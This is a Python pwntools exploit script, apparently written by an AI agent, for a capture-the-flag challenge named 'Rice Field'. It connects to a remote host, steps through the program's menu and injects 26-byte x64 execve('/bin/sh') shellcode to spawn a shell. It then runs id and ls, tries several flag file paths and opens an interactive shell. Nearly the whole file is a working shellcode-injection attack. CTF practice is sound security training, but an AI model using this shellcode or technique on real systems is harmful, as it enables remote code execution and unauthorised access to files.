#!/usr/bin/env python3
"""
Rice Field Exploit - Final Version
Author: AI Agent
Purpose: Execute shellcode on the Rice Field pwn challenge
Created: 2025-11-20 14:00
Expected result: Get a shell and read the flag
Produced result: TBD
"""

from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

# Connection details
HOST = '154.57.164.68'
PORT = 30094

# Compact x64 execve("/bin/sh") shellcode (26 bytes)
shellcode = bytes.fromhex('4831f65648bf2f62696e2f736800574889e74831d26a3b580f05')

# Use 25 or 26 rice
rice_amount = 26

print(f"[*] Shellcode length: {len(shellcode)} bytes")
print(f"[*] Using rice amount: {rice_amount}")

# Connect to remote
p = remote(HOST, PORT)

# Wait for the full-width > prompt (ï¼ž = \xef\xbc\x9e)
print("[*] Waiting for initial menu...")
p.recvuntil(b'\xef\xbc\x9e')  # Full-width > character

# Select option 1 (collect rice)
print("[*] Selecting option 1: Collect rice")
p.sendline(b'1')
time.sleep(0.5)

# Wait for % prompt
p.recvuntil(b'\xef\xbc\x85')  # Full-width % character

# Send rice amount
print(f"[*] Collecting {rice_amount} rice")
p.sendline(str(rice_amount).encode())
time.sleep(0.5)

# Wait for next menu prompt
print("[*] Waiting for second menu...")
p.recvuntil(b'\xef\xbc\x9e')  # Full-width > character

# Select option 2 (cook rice)
print("[*] Selecting option 2: Cook rice")
p.sendline(b'2')
time.sleep(0.5)

# Send shellcode
print(f"[*] Sending {len(shellcode)} bytes of shellcode...")
p.send(shellcode)
time.sleep(1)

# Try to interact with the shell
print("[*] Shell should be spawned, trying commands...")
try:
    p.sendline(b'id')
    time.sleep(0.5)
    response = p.recv(timeout=2)
    print(f"[+] Response: {response}")

    # List files
    p.sendline(b'ls -la')
    time.sleep(0.5)
    response = p.recv(timeout=2)
    print(f"[+] Files: {response}")

    # Try to cat flag
    for flag_name in ['flag.txt', 'flag', '/flag.txt', '/flag']:
        p.sendline(f'cat {flag_name}'.encode())
        time.sleep(0.5)
        response = p.recv(timeout=1)
        if b'HTB{' in response:
            flag = response.split(b'HTB{')[1].split(b'}')[0]
            print(f"[+] FLAG: HTB{{{flag.decode()}}}")
            break
        elif response and b'No such file' not in response:
            print(f"[*] {flag_name}: {response}")

    # Give interactive shell
    print("[*] Dropping to interactive shell...")
    p.interactive()

except EOFError:
    print("[-] Connection closed")
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
finally:
    try:
        p.close()
    except:
        pass
